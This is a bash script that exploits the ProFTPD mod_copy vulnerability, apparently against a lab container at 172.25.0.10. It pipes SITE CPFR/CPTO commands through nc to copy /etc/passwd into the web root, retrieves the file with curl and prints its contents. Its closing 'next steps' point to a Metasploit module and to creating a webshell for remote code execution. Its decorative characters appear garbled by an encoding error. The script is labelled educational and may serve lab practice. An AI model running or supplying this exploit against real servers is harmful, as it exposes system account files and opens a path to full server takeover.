#!/bin/bash

# ProFTPD mod_copy Exploitation Test Script
# This demonstrates the vulnerability for educational purposes

echo "‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó"
echo "‚ïë     ProFTPD mod_copy Vulnerability Test             ‚ïë"
echo "‚ïë         Educational Demonstration Only               ‚ïë"
echo "‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"
echo ""

# Set target (adjust if needed)
TARGET_IP="172.25.0.10"
FTP_PORT="21"

echo "üéØ Target: $TARGET_IP:$FTP_PORT"
echo ""

# Test 1: Basic connectivity
echo "üì° Test 1: Checking FTP connectivity..."
timeout 2 bash -c "echo 'QUIT' | nc $TARGET_IP $FTP_PORT" > /tmp/ftp_test.txt 2>&1

if grep -q "220" /tmp/ftp_test.txt; then
    echo "‚úÖ FTP service is accessible"
    cat /tmp/ftp_test.txt | head -1
else
    echo "‚ùå Cannot connect to FTP service"
    echo "   Make sure the container is running: docker ps"
    exit 1
fi

echo ""
echo "üîç Test 2: Testing mod_copy vulnerability..."
echo "   Attempting to copy /etc/passwd to web directory..."

# Create exploit commands
cat > /tmp/exploit_commands.txt << EOF
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/test_passwd.txt
QUIT
EOF

# Send commands to FTP
nc $TARGET_IP $FTP_PORT < /tmp/exploit_commands.txt > /tmp/exploit_result.txt 2>&1

if grep -q "Copy successful" /tmp/exploit_result.txt || grep -q "250" /tmp/exploit_result.txt; then
    echo "‚úÖ mod_copy commands executed successfully"
    echo ""
    echo "üåê Test 3: Verifying file access via web..."
    sleep 2
    
    # Try to access the copied file via HTTP
    if curl -s "http://$TARGET_IP/test_passwd.txt" | grep -q "root:"; then
        echo "‚úÖ Successfully accessed copied file via web!"
        echo "   File contents (first 3 lines):"
        curl -s "http://$TARGET_IP/test_passwd.txt" | head -3 | sed 's/^/   /'
        echo ""
        echo "üéØ VULNERABILITY CONFIRMED!"
        echo "   The ProFTPD server is vulnerable to mod_copy exploitation."
    else
        echo "‚ö†Ô∏è  File copy may have succeeded but web access failed"
        echo "   This could be due to permissions or web server configuration"
    fi
else
    echo "‚ùå mod_copy commands failed"
    echo "   Response from server:"
    cat /tmp/exploit_result.txt | sed 's/^/   /'
fi

# Cleanup
rm -f /tmp/ftp_test.txt /tmp/exploit_commands.txt /tmp/exploit_result.txt

echo ""
echo "üìö Next Steps:"
echo "   1. Try manual exploitation with: nc $TARGET_IP $FTP_PORT"
echo "   2. Use Metasploit module: exploit/unix/ftp/proftpd_modcopy_exec"
echo "   3. Create a webshell for RCE"
echo ""
echo "‚ö†Ô∏è  Remember: Use only for authorized testing!"
